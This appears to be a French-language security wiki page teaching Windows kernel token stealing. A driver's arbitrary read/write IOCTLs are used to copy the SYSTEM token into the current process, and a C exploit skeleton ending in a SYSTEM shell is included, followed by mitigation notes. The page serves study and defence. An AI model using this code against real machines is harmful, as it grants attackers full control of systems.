# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Vue d'ensemble

Si un driver vulnérable expose un IOCTL donnant à un attaquant des primitives de lecture et/ou d'écriture arbitraires dans le kernel, l'élévation vers NT AUTHORITY\SYSTEM peut souvent être obtenue en volant le token d'accès SYSTEM. La technique copie le pointeur Token de l'EPROCESS d'un process SYSTEM dans l'EPROCESS du processus courant.

Pourquoi ça fonctionne :
- Chaque processus possède une structure EPROCESS qui contient (entre autres champs) un Token (en fait un EX_FAST_REF vers un objet token).
- Le processus SYSTEM (PID 4) possède un token avec tous les privilèges activés.
- Remplacer l'EPROCESS.Token du processus courant par le pointeur du token SYSTEM fait exécuter immédiatement le processus courant en tant que SYSTEM.

> Les offsets dans EPROCESS varient selon les versions de Windows. Déterminez-les dynamiquement (symboles) ou utilisez des constantes spécifiques à la version. Notez aussi que EPROCESS.Token est un EX_FAST_REF (les 3 bits de poids faible sont des flags de comptage de références).

## Étapes principales

1) Localiser la base de ntoskrnl.exe et résoudre l'adresse de PsInitialSystemProcess.
- Depuis le mode utilisateur, utilisez NtQuerySystemInformation(SystemModuleInformation) ou EnumDeviceDrivers pour obtenir les bases des drivers chargés.
- Ajoutez l'offset de PsInitialSystemProcess (depuis les symboles/le reverse) à la base du kernel pour obtenir son adresse.
2) Lire le pointeur à PsInitialSystemProcess → il s'agit d'un pointeur kernel vers l'EPROCESS de SYSTEM.
3) Depuis l'EPROCESS de SYSTEM, lisez les offsets UniqueProcessId et ActiveProcessLinks pour parcourir la liste doublement chaînée des structures EPROCESS (ActiveProcessLinks.Flink/Blink) jusqu'à trouver l'EPROCESS dont UniqueProcessId est égal à GetCurrentProcessId(). Conservez les deux :
- EPROCESS_SYSTEM (pour SYSTEM)
- EPROCESS_SELF (pour le processus courant)
4) Lire la valeur du token SYSTEM : Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Masquez les 3 bits de poids faible : Token_SYS_masked = Token_SYS & ~0xF (généralement ~0xF ou ~0x7 selon le build ; sur x64, les 3 bits de poids faible sont utilisés — masque 0xFFFFFFFFFFFFFFF8).
5) Option A (commune) : Conservez les 3 bits de poids faible de votre token actuel et fusionnez-les sur le pointeur SYSTEM pour garder le comptage de références embarqué cohérent.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Écrivez Token_NEW dans (EPROCESS_SELF + TokenOffset) en utilisant votre primitive d'écriture kernel.
7) Votre processus courant est maintenant SYSTEM. Éventuellement, lancez un nouveau cmd.exe ou powershell.exe pour confirmer.

## Pseudo-code

Ci-dessous un squelette qui n'utilise que deux IOCTLs d'un driver vulnérable, un pour une lecture kernel de 8 octets et un pour une écriture kernel de 8 octets. Remplacez par l'interface de votre driver.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Remarques :
- Offsets : Utilisez WinDbg’s `dt nt!_EPROCESS` avec les PDBs de la cible, ou un chargeur de symboles à l'exécution, pour obtenir les offsets corrects. Ne pas coder en dur les offsets aveuglément.
- Mask : Sur x64 le token est un EX_FAST_REF ; les 3 bits de poids faible sont des bits de compteur de références. Conserver les bits faibles originaux de votre token évite des incohérences de refcount immédiates.
- Stability : Préférez élever le processus actuel ; si vous élevez un helper de courte durée vous pouvez perdre SYSTEM lorsqu'il se termine.

## Détection & atténuation
- Le chargement de pilotes tiers non signés ou non fiables exposant des IOCTLs puissants est la cause principale.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard, and Attack Surface Reduction rules peuvent empêcher le chargement de pilotes vulnérables.
- EDR peut surveiller les séquences IOCTL suspectes qui implémentent des opérations de lecture/écriture arbitraires et les échanges de token.

## Références
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
